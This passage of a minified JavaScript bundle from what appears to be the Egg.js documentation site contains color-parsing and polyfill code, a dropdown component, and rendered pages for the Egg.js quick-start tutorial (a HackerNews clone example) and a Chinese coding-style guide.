e&&(h(e.r)&&h(e.g)&&h(e.b)?(t=Object(a["i"])(e.r,e.g,e.b),c=!0,s="%"===String(e.r).substr(-1)?"prgb":"rgb"):h(e.h)&&h(e.s)&&h(e.v)?(r=Object(l["d"])(e.s),o=Object(l["d"])(e.v),t=Object(a["c"])(e.h,r,o),c=!0,s="hsv"):h(e.h)&&h(e.s)&&h(e.l)&&(r=Object(l["d"])(e.s),i=Object(l["d"])(e.l),t=Object(a["b"])(e.h,r,i),c=!0,s="hsl"),Object.prototype.hasOwnProperty.call(e,"a")&&(n=e.a)),n=Object(l["b"])(n),{ok:c,format:e.format||s,r:Math.min(255,Math.max(t.r,0)),g:Math.min(255,Math.max(t.g,0)),b:Math.min(255,Math.max(t.b,0)),a:n}}var i="[-\\+]?\\d+%?",c="[-\\+]?\\d*\\.\\d+%?",s="(?:".concat(c,")|(?:").concat(i,")"),u="[\\s|\\(]+(".concat(s,")[,|\\s]+(").concat(s,")[,|\\s]+(").concat(s,")\\s*\\)?"),d="[\\s|\\(]+(".concat(s,")[,|\\s]+(").concat(s,")[,|\\s]+(").concat(s,")[,|\\s]+(").concat(s,")\\s*\\)?"),m={CSS_UNIT:new RegExp(s),rgb:new RegExp("rgb"+u),rgba:new RegExp("rgba"+d),hsl:new RegExp("hsl"+u),hsla:new RegExp("hsla"+d),hsv:new RegExp("hsv"+u),hsva:new RegExp("hsva"+d),hex3:/^#?([0-9a-fA-F]{1})([0-9a-fA-F]{1})([0-9a-fA-F]{1})$/,hex6:/^#?([0-9a-fA-F]{2})([0-9a-fA-F]{2})([0-9a-fA-F]{2})$/,hex4:/^#?([0-9a-fA-F]{1})([0-9a-fA-F]{1})([0-9a-fA-F]{1})([0-9a-fA-F]{1})$/,hex8:/^#?([0-9a-fA-F]{2})([0-9a-fA-F]{2})([0-9a-fA-F]{2})([0-9a-fA-F]{2})$/};function p(e){if(e=e.trim().toLowerCase(),0===e.length)return!1;var t=!1;if(r["a"][e])e=r["a"][e],t=!0;else if("transparent"===e)return{r:0,g:0,b:0,a:0,format:"name"};var n=m.rgb.exec(e);return n?{r:n[1],g:n[2],b:n[3]}:(n=m.rgba.exec(e),n?{r:n[1],g:n[2],b:n[3],a:n[4]}:(n=m.hsl.exec(e),n?{h:n[1],s:n[2],l:n[3]}:(n=m.hsla.exec(e),n?{h:n[1],s:n[2],l:n[3],a:n[4]}:(n=m.hsv.exec(e),n?{h:n[1],s:n[2],v:n[3]}:(n=m.hsva.exec(e),n?{h:n[1],s:n[2],v:n[3],a:n[4]}:(n=m.hex8.exec(e),n?{r:Object(a["e"])(n[1]),g:Object(a["e"])(n[2]),b:Object(a["e"])(n[3]),a:Object(a["a"])(n[4]),format:t?"name":"hex8"}:(n=m.hex6.exec(e),n?{r:Object(a["e"])(n[1]),g:Object(a["e"])(n[2]),b:Object(a["e"])(n[3]),format:t?"name":"hex"}:(n=m.hex4.exec(e),n?{r:Object(a["e"])(n[1]+n[1]),g:Object(a["e"])(n[2]+n[2]),b:Object(a["e"])(n[3]+n[3]),a:Object(a["a"])(n[4]+n[4]),format:t?"name":"hex8"}:(n=m.hex3.exec(e),!!n&&{r:Object(a["e"])(n[1]+n[1]),g:Object(a["e"])(n[2]+n[2]),b:Object(a["e"])(n[3]+n[3]),format:t?"name":"hex"})))))))))}function h(e){return Boolean(m.CSS_UNIT.exec(String(e)))}},bSD4:function(e,t,n){"use strict";var a=n("0mt+"),r=n("YtQ9"),l=[].reverse,o=[1,2];a({target:"Array",proto:!0,forced:String(o)===String(o.reverse())},{reverse:function(){return r(this)&&(this.length=this.length),l.call(this)}})},bUpX:function(e,t,n){"use strict";var a={}.propertyIsEnumerable,r=Object.getOwnPropertyDescriptor,l=r&&!a.call({1:2},1);t.f=l?function(e){var t=r(this,e);return!!t&&t.enumerable}:a},bcNs:function(e,t,n){var a=n("WM7W");a("isConcatSpreadable")},"be/u":function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"This guide covers getting up and running a real example using Egg. By following along with this guide step by step, you can quickly get started with Egg development."),r.a.createElement("h2",{id:"prerequisites"},r.a.createElement(l["AnchorLink"],{to:"#prerequisites","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Prerequisites"),r.a.createElement("ul",null,r.a.createElement("li",null,"Operating System: Linux, OS X or Windows."),r.a.createElement("li",null,"Node.js Runtime: 8.x or newer; it is recommended that you use ",r.a.createElement(l["Link"],{to:"http://nodejs.org/"},"LTS Releases"),".")),r.a.createElement("h2",{id:"the-quick-way"},r.a.createElement(l["AnchorLink"],{to:"#the-quick-way","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"The Quick Way"),r.a.createElement("p",null,"To begin with, let's quickly initialize the project by using a scaffold, which will quickly generate some of the major pieces of the application (",r.a.createElement("code",null,"npm >=6.1.0"),")."),r.a.createElement(o["a"],{code:"$ mkdir egg-example && cd egg-example\n$ npm init egg --type=simple\n$ npm i",lang:"bash"}),r.a.createElement("p",null,"Then get up and run by using the following commands."),r.a.createElement(o["a"],{code:"$ npm run dev\n$ open http://localhost:7001",lang:"bash"}),r.a.createElement("h2",{id:"step-by-step"},r.a.createElement(l["AnchorLink"],{to:"#step-by-step","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Step by Step"),r.a.createElement("p",null,"Usually you can just use ",r.a.createElement("code",null,"npm init egg")," of the previous section, choose a scaffold that best fits your business model and quickly generate a project, then get started with the development."),r.a.createElement("p",null,"However, in this section, instead of using scaffolds we will build a project called ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/examples/tree/master/hackernews"},"Egg HackerNews")," step by step, for a better understanding of how it works."),r.a.createElement("p",null,r.a.createElement("img",{src:"https://cloud.githubusercontent.com/assets/227713/22960991/812999bc-f37d-11e6-8bd5-a96ca37d0ff2.png",alt:"Egg HackerNews Snapshoot"})),r.a.createElement("h3",{id:"initialization"},r.a.createElement(l["AnchorLink"],{to:"#initialization","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Initialization"),r.a.createElement("p",null,"First let's create the project directory and initialize its structure."),r.a.createElement(o["a"],{code:"$ mkdir egg-example\n$ cd egg-example\n$ npm init\n$ npm i egg --save\n$ npm i egg-bin --save-dev",lang:"bash"}),r.a.createElement("p",null,"Then add ",r.a.createElement("code",null,"npm scripts")," to ",r.a.createElement("code",null,"package.json"),"."),r.a.createElement(o["a"],{code:'{\n  "name": "egg-example",\n  "scripts": {\n    "dev": "egg-bin dev"\n  }\n}',lang:"json"}),r.a.createElement("h3",{id:"create-a-controller"},r.a.createElement(l["AnchorLink"],{to:"#create-a-controller","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Create a Controller"),r.a.createElement("p",null,"If you are familiar with the MVC architecture, you might have already guessed that the first thing to create is a ",r.a.createElement(l["Link"],{to:"../basics/controller"},"controller")," and ",r.a.createElement(l["Link"],{to:"../basics/router"},"router"),"."),r.a.createElement(o["a"],{code:"// app/controller/home.js\nconst Controller = require('egg').Controller;\n\nclass HomeController extends Controller {\n  async index() {\n    this.ctx.body = 'Hello world';\n  }\n}\n\nmodule.exports = HomeController;",lang:"js"}),r.a.createElement("p",null,"Then edit the router file and add a mapping."),r.a.createElement(o["a"],{code:"// app/router.js\nmodule.exports = (app) => {\n  const { router, controller } = app;\n  router.get('/', controller.home.index);\n};",lang:"js"}),r.a.createElement("p",null,"Then add a ",r.a.createElement(l["Link"],{to:"../basics/config"},"configuration")," file:"),r.a.createElement(o["a"],{code:"// config/config.default.js\nexports.keys = <YOUR_SECURITY_COOKIE_KEYS>;",lang:"js"}),r.a.createElement("p",null,"The project directory looks like this:"),r.a.createElement(o["a"],{code:"egg-example\n\u251c\u2500\u2500 app\n\u2502   \u251c\u2500\u2500 controller\n\u2502   \u2502   \u2514\u2500\u2500 home.js\n\u2502   \u2514\u2500\u2500 router.js\n\u251c\u2500\u2500 config\n\u2502   \u2514\u2500\u2500 config.default.js\n\u2514\u2500\u2500 package.json",lang:"bash"}),r.a.createElement("p",null,"For more information about directory structure, see ",r.a.createElement(l["Link"],{to:"../basics/structure"},"Directory Structure"),"."),r.a.createElement("p",null,"Now you can start up the Web Server and see your application in action."),r.a.createElement(o["a"],{code:"$ npm run dev\n$ open http://localhost:7001",lang:"bash"}),r.a.createElement("blockquote",null,r.a.createElement("p",null,"Note\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"You could write ",r.a.createElement("code",null,"Controller")," with ",r.a.createElement("code",null,"class")," or ",r.a.createElement("code",null,"exports")," style, see more detail at ",r.a.createElement(l["Link"],{to:"../basics/controller"},"Controller"),"."),r.a.createElement("li",null,"And ",r.a.createElement("code",null,"Config")," could write with ",r.a.createElement("code",null,"module.exports")," or ",r.a.createElement("code",null,"exports")," style, see more detail at ",r.a.createElement(l["Link"],{to:"https://nodejs.org/api/modules.html#modules_exports_shortcut"},"Node.js modules docs"),"."))),r.a.createElement("h3",{id:"adding-static-assets"},r.a.createElement(l["AnchorLink"],{to:"#adding-static-assets","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Adding Static Assets"),r.a.createElement("p",null,"Egg has a built-in plugin called ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-static"},"static"),". In production, it is recommended that you deploy static assets to CDN instead of using this plugin."),r.a.createElement("p",null,r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-static"},"static")," maps ",r.a.createElement("code",null,"/public/*")," to the directory ",r.a.createElement("code",null,"app/public/*")," by default."),r.a.createElement("p",null,"In this case, we just need to put our static assets into the directory ",r.a.createElement("code",null,"app/public"),"."),r.a.createElement(o["a"],{code:"app/public\n\u251c\u2500\u2500 css\n\u2502   \u2514\u2500\u2500 news.css\n\u2514\u2500\u2500 js\n    \u251c\u2500\u2500 lib.js\n    \u2514\u2500\u2500 news.js",lang:"bash"}),r.a.createElement("h3",{id:"adding-templates-for-rendering"},r.a.createElement(l["AnchorLink"],{to:"#adding-templates-for-rendering","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Adding Templates for Rendering"),r.a.createElement("p",null,"In most cases, data are usually read, processed and rendered by the templates before being presented to the user. Thus we need to introduce corresponding template engines to handle it."),r.a.createElement("p",null,"Egg does not force to use any particular template engines, but specifies the ",r.a.createElement(l["Link"],{to:"../advanced/view-plugin"},"View Plugins Specification"),"to allow the developers to use different plugins for their individual needs instead."),r.a.createElement("p",null,"For more information, cf. ",r.a.createElement(l["Link"],{to:"../core/view"},"View"),"."),r.a.createElement("p",null,"In this example, we will use ",r.a.createElement(l["Link"],{to:"https://mozilla.github.io/nunjucks/"},"Nunjucks"),"."),r.a.createElement("p",null,"First install the corresponding plugin ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-view-nunjucks"},"egg-view-nunjucks"),"."),r.a.createElement(o["a"],{code:"$ npm i egg-view-nunjucks --save",lang:"bash"}),r.a.createElement("p",null,"And enable it."),r.a.createElement(o["a"],{code:"// config/plugin.js\nexports.nunjucks = {\n  enable: true,\n  package: 'egg-view-nunjucks',\n};",lang:"js"}),r.a.createElement(o["a"],{code:"// config/config.default.js\nexports.keys = <YOUR_SECURITY_COOKE_KEYS>;\n// add view's configurations\nexports.view = {\n  defaultViewEngine: 'nunjucks',\n  mapping: {\n    '.tpl': 'nunjucks',\n  },\n};",lang:"js"}),r.a.createElement("p",null,r.a.createElement("strong",null,"Carefully! ",r.a.createElement("code",null,"config")," dir, not ",r.a.createElement("code",null,"app/config"),"!")),r.a.createElement("p",null,"Then create a template for the index page. This usually goes to the app/view directory."),r.a.createElement(o["a"],{code:'\x3c!-- app/view/news/list.tpl --\x3e\n<html>\n  <head>\n    <title>Egg HackerNews Clone</title>\n    <link rel="stylesheet" href="/public/css/news.css" />\n  </head>\n  <body>\n    <ul class="news-view view">\n      {% for item in list %}\n      <li class="item">\n        <a href="{{ item.url }}">{{ item.title }}</a>\n      </li>\n      {% endfor %}\n    </ul>\n  </body>\n</html>',lang:"html"}),r.a.createElement("p",null,"Then add a controller and router."),r.a.createElement(o["a"],{code:"// app/controller/news.js\nconst Controller = require('egg').Controller;\n\nclass NewsController extends Controller {\n  async list() {\n    const dataList = {\n      list: [\n        { id: 1, title: 'this is news 1', url: '/news/1' },\n        { id: 2, title: 'this is news 2', url: '/news/2' },\n      ],\n    };\n    await this.ctx.render('news/list.tpl', dataList);\n  }\n}\n\nmodule.exports = NewsController;\n\n// app/router.js\nmodule.exports = (app) => {\n  const { router, controller } = app;\n  router.get('/', controller.home.index);\n  router.get('/news', controller.news.list);\n};",lang:"js"}),r.a.createElement("p",null,"Open a browser window and navigate to ",r.a.createElement(l["Link"],{to:"http://localhost:7001/news"},"http://localhost:7001/news"),". You should be able to see the rendered page."),r.a.createElement("p",null,r.a.createElement("strong",null,"Tip\uff1aIn development, Egg enables the ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-development"},"development")," plugin by default, which reloads your worker process when changes are made to your back-end code.")),r.a.createElement("h3",{id:"create-a-service"},r.a.createElement(l["AnchorLink"],{to:"#create-a-service","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Create a Service"),r.a.createElement("p",null,"In practice, controllers usually won't generate data on their own, neither will they contain complicated business logic. Complicated business logic should be abstracted as a busineess logic layer instead, i.e., ",r.a.createElement(l["Link"],{to:"../basics/service"},"service"),"."),r.a.createElement("p",null,"Let's create a service to fetch data from the",r.a.createElement(l["Link"],{to:"https://github.com/HackerNews/API"},"HackerNews"),"."),r.a.createElement(o["a"],{code:"// app/service/news.js\nconst Service = require('egg').Service;\n\nclass NewsService extends Service {\n  async list(page = 1) {\n    // read config\n    const { serverUrl, pageSize } = this.config.news;\n\n    // use build-in http client to GET hacker-news api\n    const { data: idList } = await this.ctx.curl(\n      `${serverUrl}/topstories.json`,\n      {\n        data: {\n          orderBy: '\"$key\"',\n          startAt: `\"${pageSize * (page - 1)}\"`,\n          endAt: `\"${pageSize * page - 1}\"`,\n        },\n        dataType: 'json',\n      },\n    );\n\n    // parallel GET detail\n    const newsList = await Promise.all(\n      Object.keys(idList).map((key) => {\n        const url = `${serverUrl}/item/${idList[key]}.json`;\n        return this.ctx.curl(url, { dataType: 'json' });\n      }),\n    );\n    return newsList.map((res) => res.data);\n  }\n}\n\nmodule.exports = NewsService;",lang:"js"}),r.a.createElement("blockquote",null,r.a.createElement("p",null,"Egg has ",r.a.createElement(l["Link"],{to:"../core/httpclient"},"HttpClient")," built in in order to help you make HTTP requests.")),r.a.createElement("p",null,"Then slightly modify our previous controller."),r.a.createElement(o["a"],{code:"// app/controller/news.js\nconst Controller = require('egg').Controller;\n\nclass NewsController extends Controller {\n  async list() {\n    const ctx = this.ctx;\n    const page = ctx.query.page || 1;\n    const newsList = await ctx.service.news.list(page);\n    await ctx.render('news/list.tpl', { list: newsList });\n  }\n}\n\nmodule.exports = NewsController;",lang:"js"}),r.a.createElement("p",null,"And also add config."),r.a.createElement(o["a"],{code:"// config/config.default.js\n// add news' configurations\nexports.news = {\n  pageSize: 5,\n  serverUrl: 'https://hacker-news.firebaseio.com/v0',\n};",lang:"js"}),r.a.createElement("h3",{id:"adding-extensions"},r.a.createElement(l["AnchorLink"],{to:"#adding-extensions","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Adding Extensions"),r.a.createElement("p",null,"We might encounter a small problem here. The time that we fetched are Unix Time format, whereas we want to present them in a more friendly way to read."),r.a.createElement("p",null,"Egg provides us with a quick way to extend its functionalities. We just need to add extension scripts to the ",r.a.createElement("code",null,"app/extend")," directory. For more information, cf. ",r.a.createElement(l["Link"],{to:"../basics/extend"},"Extensions"),"."),r.a.createElement("p",null,"In the case of view, we can just write a helper as an extension."),r.a.createElement(o["a"],{code:"$ npm i moment --save",lang:"bash"}),r.a.createElement(o["a"],{code:"// app/extend/helper.js\nconst moment = require('moment');\nexports.relativeTime = (time) => moment(new Date(time * 1000)).fromNow();",lang:"js"}),r.a.createElement("p",null,"Then use it in the templates."),r.a.createElement(o["a"],{code:"\x3c!-- app/view/news/list.tpl --\x3e\n{{ helper.relativeTime(item.time) }}",lang:"html"}),r.a.createElement("h3",{id:"adding-middlewares"},r.a.createElement(l["AnchorLink"],{to:"#adding-middlewares","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Adding Middlewares"),r.a.createElement("p",null,"Suppose that we wanted to prohibit accesses from Baidu crawlers."),r.a.createElement("p",null,"Smart developers might quickly guess that we can achieve it by adding a ",r.a.createElement(l["Link"],{to:"../basics/middleware"},"middleware"),"that checks the User-Agent."),r.a.createElement(o["a"],{code:"// app/middleware/robot.js\n// options === app.config.robot\nmodule.exports = (options, app) => {\n  return async function robotMiddleware(ctx, next) {\n    const source = ctx.get('user-agent') || '';\n    const match = options.ua.some((ua) => ua.test(source));\n    if (match) {\n      ctx.status = 403;\n      ctx.message = 'Go away, robot.';\n    } else {\n      await next();\n    }\n  };\n};\n\n// config/config.default.js\n// add middleware robot\nexports.middleware = ['robot'];\n// robot's configurations\nexports.robot = {\n  ua: [/Baiduspider/i],\n};",lang:"js"}),r.a.createElement("p",null,"Now try it using ",r.a.createElement("code",null,'curl localhost:7001/news -A "Baiduspider"'),"."),r.a.createElement("p",null,"See ",r.a.createElement(l["Link"],{to:"../basics/middleware"},"Middleware")," for more details."),r.a.createElement("h3",{id:"adding-configurations"},r.a.createElement(l["AnchorLink"],{to:"#adding-configurations","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Adding Configurations"),r.a.createElement("p",null,"When writing business logic, it is inevitable that we need to manage configurations. Egg provides a powerful way to manage them in a merged configuration file."),r.a.createElement("ul",null,r.a.createElement("li",null,"Environment-specific configuration files are well supported, e.g. config.local.js, config.prod.js, etc."),r.a.createElement("li",null,"Configurations could be set wherever convenient for Applications/Plugins/Frameworks, and Egg will be careful to merge and load them."),r.a.createElement("li",null,"For more information on merging, see ",r.a.createElement(l["Link"],{to:"../basics/config"},"Configurations"),".")),r.a.createElement(o["a"],{code:"// config/config.default.js\nexports.robot = {\n  ua: [/curl/i, /Baiduspider/i],\n};\n\n// config/config.local.js\n// only read at development mode, will override default\nexports.robot = {\n  ua: [/Baiduspider/i],\n};\n\n// app/service/some.js\nconst Service = require('egg').Service;\n\nclass SomeService extends Service {\n  async list() {\n    const rule = this.config.robot.ua;\n  }\n}\n\nmodule.exports = SomeService;",lang:"js"}),r.a.createElement("h3",{id:"adding-unit-testing"},r.a.createElement(l["AnchorLink"],{to:"#adding-unit-testing","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Adding Unit Testing"),r.a.createElement("p",null,"Unit Testing is very important, and Egg also provides ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-bin"},"egg-bin")," to help you write tests painless."),r.a.createElement("p",null,"All the test files should be placed at ",r.a.createElement("code",null,"{","app_root","}","/test/**/*.test.js"),"."),r.a.createElement(o["a"],{code:"// test/app/middleware/robot.test.js\nconst { app, mock, assert } = require('egg-mock/bootstrap');\n\ndescribe('test/app/middleware/robot.test.js', () => {\n  it('should block robot', () => {\n    return app\n      .httpRequest()\n      .get('/')\n      .set('User-Agent', 'Baiduspider')\n      .expect(403);\n  });\n});",lang:"js"}),r.a.createElement("p",null,"Then add ",r.a.createElement("code",null,"npm scripts"),"."),r.a.createElement(o["a"],{code:'{\n  "scripts": {\n    "test": "egg-bin test",\n    "cov": "egg-bin cov"\n  }\n}',lang:"json"}),r.a.createElement("p",null,"Also install dependencies."),r.a.createElement(o["a"],{code:"$ npm i egg-mock --save-dev",lang:"bash"}),r.a.createElement("p",null,"Run it."),r.a.createElement(o["a"],{code:"$ npm test",lang:"bash"}),r.a.createElement("p",null,"That is all of it, for more detail, see ",r.a.createElement(l["Link"],{to:"../core/unittest"},"Unit Testing"),"."),r.a.createElement("h2",{id:"conclusions"},r.a.createElement(l["AnchorLink"],{to:"#conclusions","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Conclusions"),r.a.createElement("p",null,"We can only touch the tip of the iceberg of Egg with the above short sections. Where to go from here? read our documentation to better understand the framework."),r.a.createElement("ul",null,r.a.createElement("li",null,"About Egg boilerplate type, See ",r.a.createElement(l["Link"],{to:"../tutorials"},"Boilerplate Type Description"),"."),r.a.createElement("li",null,"Egg provides a powerful mechanism for extending features. See ",r.a.createElement(l["Link"],{to:"../basics/plugin"},"Plugin"),"."),r.a.createElement("li",null,"Egg framework allows small or large teams to work together as fast as possible under the well-documented conventions and coding best practices. In addition, the teams can build up logics on top of the framework to better suit their special needs. See more on [Frameworks].(../advanced/framework.md)."),r.a.createElement("li",null,"Egg framework provides code reusabilities and modularities. See details at ",r.a.createElement(l["Link"],{to:"../intro/progressive"},"Progressive"),"."),r.a.createElement("li",null,"Egg framework enables developers to write painless unit testing with many plugins and community-powered toolings. The team should give it a try by using Egg unit testing without worrying about setting up the testing tooling but writing the testing logics. See ",r.a.createElement(l["Link"],{to:"../core/unittest"},"Unit Testing"),"."))))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},bgne:function(e,t,n){"use strict";var a=n("qPib"),r=n("3Qq0"),l=n("0YMn"),o=n("EJBU"),i=n("FU0I"),c=n("y+Tp"),s=n("VGn1"),u=n.n(s),d={adjustX:1,adjustY:1},m=[0,0],p={topLeft:{points:["bl","tl"],overflow:d,offset:[0,-4],targetOffset:m},topCenter:{points:["bc","tc"],overflow:d,offset:[0,-4],targetOffset:m},topRight:{points:["br","tr"],overflow:d,offset:[0,-4],targetOffset:m},bottomLeft:{points:["tl","bl"],overflow:d,offset:[0,4],targetOffset:m},bottomCenter:{points:["tc","bc"],overflow:d,offset:[0,4],targetOffset:m},bottomRight:{points:["tr","br"],overflow:d,offset:[0,4],targetOffset:m}},h=p,g=n("4Sss"),f=n("WeeI"),E=n("qLmf"),b=g["a"].ESC,v=g["a"].TAB;function y(e){var t=e.visible,n=e.setTriggerVisible,a=e.triggerRef,r=e.onVisibleChange,l=e.autoFocus,o=i["useRef"](!1),c=function(){var e,l,o,i;t&&a.current&&(null===(e=a.current)||void 0===e||null===(l=e.triggerRef)||void 0===l||null===(o=l.current)||void 0===o||null===(i=o.focus)||void 0===i||i.call(o),n(!1),"function"===typeof r&&r(!1))},s=function(){var e,t,n,r,l=Object(E["a"])(null===(e=a.current)||void 0===e||null===(t=e.popupRef)||void 0===t||null===(n=t.current)||void 0===n||null===(r=n.getElement)||void 0===r?void 0:r.call(n)),i=l[0];return!!(null===i||void 0===i?void 0:i.focus)&&(i.focus(),o.current=!0,!0)},u=function(e){switch(e.keyCode){case b:c();break;case v:var t=!1;o.current||(t=s()),t?e.preventDefault():c();break}};i["useEffect"]((function(){return t?(window.addEventListener("keydown",u),l&&Object(f["a"])(s,3),function(){window.removeEventListener("keydown",u),o.current=!1}):function(){o.current=!1}}),[t])}var k=["arrow","prefixCls","transitionName","animation","align","placement","placements","getPopupContainer","showAction","hideAction","overlayClassName","overlayStyle","visible","trigger","autoFocus"];function w(e,t){var n=e.arrow,s=void 0!==n&&n,d=e.prefixCls,m=void 0===d?"rc-dropdown":d,p=e.transitionName,g=e.animation,f=e.align,E=e.placement,b=void 0===E?"bottomLeft":E,v=e.placements,w=void 0===v?h:v,x=e.getPopupContainer,j=e.showAction,S=e.hideAction,C=e.overlayClassName,A=e.overlayStyle,L=e.visible,T=e.trigger,N=void 0===T?["hover"]:T,O=e.autoFocus,I=Object(o["a"])(e,k),P=i["useState"](),R=Object(l["a"])(P,2),_=R[0],q=R[1],M="visible"in e?L:_,F=i["useRef"](null);i["useImperativeHandle"](t,(function(){return F.current})),y({visible:M,setTriggerVisible:q,triggerRef:F,onVisibleChange:e.onVisibleChange,autoFocus:O});var D=function(){var t,n=e.overlay;return t="function"===typeof n?n():n,t},U=function(t){var n=e.onOverlayClick;q(!1),n&&n(t)},z=function(t){var n=e.onVisibleChange;q(t),"function"===typeof n&&n(t)},H=function(){var e=D();return i["createElement"](i["Fragment"],null,s&&i["createElement"]("div",{className:"".concat(m,"-arrow")}),e)},B=function(){var t=e.overlay;return"function"===typeof t?H:H()},W=function(){var t=e.minOverlayWidthMatchTrigger,n=e.alignPoint;return"minOverlayWidthMatchTrigger"in e?t:!n},V=function(){var t=e.openClassName;return void 0!==t?t:"".concat(m,"-open")},$=function(){var t=e.children,n=t.props?t.props:{},a=u()(n.className,V());return M&&t?i["cloneElement"](t,{className:a}):t},G=S;return G||-1===N.indexOf("contextMenu")||(G=["click"]),i["createElement"](c["a"],Object(r["a"])(Object(r["a"])({builtinPlacements:w},I),{},{prefixCls:m,ref:F,popupClassName:u()(C,Object(a["a"])({},"".concat(m,"-show-arrow"),s)),popupStyle:A,action:N,showAction:j,hideAction:G||[],popupPlacement:b,popupAlign:f,popupTransitionName:p,popupAnimation:g,popupVisible:M,stretch:W()?"minWidth":"",popup:B(),onPopupVisibleChange:z,onPopupClick:U,getPopupContainer:x}),$())}var x=i["forwardRef"](w);t["a"]=x},bmJU:function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"\u5efa\u8bae\u5f00\u53d1\u8005\u4f7f\u7528 ",r.a.createElement("code",null,"npm init egg --type=simple showcase")," \u6765\u751f\u6210\u5e76\u89c2\u5bdf\u63a8\u8350\u7684\u9879\u76ee\u7ed3\u6784\u548c\u914d\u7f6e\u3002"),r.a.createElement("h2",{id:"\u7528\u7c7b\u7684\u5f62\u5f0f\u5448\u73b0classify"},r.a.createElement(l["AnchorLink"],{to:"#\u7528\u7c7b\u7684\u5f62\u5f0f\u5448\u73b0classify","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u7528\u7c7b\u7684\u5f62\u5f0f\u5448\u73b0\uff08Classify\uff09"),r.a.createElement("p",null,"\u65e7\u5199\u6cd5\uff1a"),r.a.createElement(o["a"],{code:"module.exports = (app) => {\n  class UserService extends app.Service {\n    async list() {\n      return await this.ctx.curl('https://eggjs.org');\n    }\n  }\n  return UserService;\n};",lang:"js"}),r.a.createElement("p",null,"\u4fee\u6539\u4e3a\uff1a"),r.a.createElement(o["a"],{code:"const Service = require('egg').Service;\nclass UserService extends Service {\n  async list() {\n    return await this.ctx.curl('https://eggjs.org');\n  }\n}\nmodule.exports = UserService;",lang:"js"}),r.a.createElement("p",null,"\u540c\u65f6\uff0c",r.a.createElement("code",null,"\u6846\u67b6\u5f00\u53d1\u8005"),"\u9700\u8981\u6539\u53d8\u5199\u6cd5\u5982\u4e0b\uff0c\u5426\u5219",r.a.createElement("code",null,"\u5e94\u7528\u5f00\u53d1\u8005"),"\u81ea\u5b9a\u4e49 Service \u7b49\u57fa\u7c7b\u4f1a\u6709\u95ee\u9898\uff1a"),r.a.createElement(o["a"],{code:"const egg = require('egg');\n\nmodule.export = Object.assign(egg, {\n  Application: class MyApplication extends egg.Application {\n    // ...\n  },\n  // ...\n});",lang:"js"}),r.a.createElement("h2",{id:"\u79c1\u6709\u5c5e\u6027\u4e0e\u6162\u521d\u59cb\u5316"},r.a.createElement(l["AnchorLink"],{to:"#\u79c1\u6709\u5c5e\u6027\u4e0e\u6162\u521d\u59cb\u5316","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u79c1\u6709\u5c5e\u6027\u4e0e\u6162\u521d\u59cb\u5316"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u79c1\u6709\u5c5e\u6027\u7528 ",r.a.createElement("code",null,"Symbol")," \u6765\u6302\u8f7d\u3002"),r.a.createElement("li",null,"Symbol \u7684\u63cf\u8ff0\u9075\u5faa jsdoc \u7684\u89c4\u5219\uff0c\u63cf\u8ff0\u6620\u5c04\u540e\u7684\u7c7b\u540d+\u5c5e\u6027\u540d\u3002"),r.a.createElement("li",null,"\u5ef6\u8fdf\u521d\u59cb\u5316\u3002")),r.a.createElement(o["a"],{code:"// app/extend/application.js\nconst CACHE = Symbol('Application#cache');\nconst CacheManager = require('../../lib/cache_manager');\n\nmodule.exports = {\n  get cache() {\n    if (!this[CACHE]) {\n      this[CACHE] = new CacheManager(this);\n    }\n    return this[CACHE];\n  },\n};",lang:"js"})))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},brgB:function(e,t,n){"use strict";var a=n("0mt+"),r=n("m4/z"),l=n("oyD1"),o=n("AOzO"),i=n("ggJa"),c=n("NBU9");a({target:"Map",proto:!0,real:!0,forced:r},{includes:function(e){return c(o(l(this)),(function(t,n){if(i(n,e))return c.stop()}),void 0,!0,!0).stopped}})},bvZK:function(e,t,n){"use strict";var 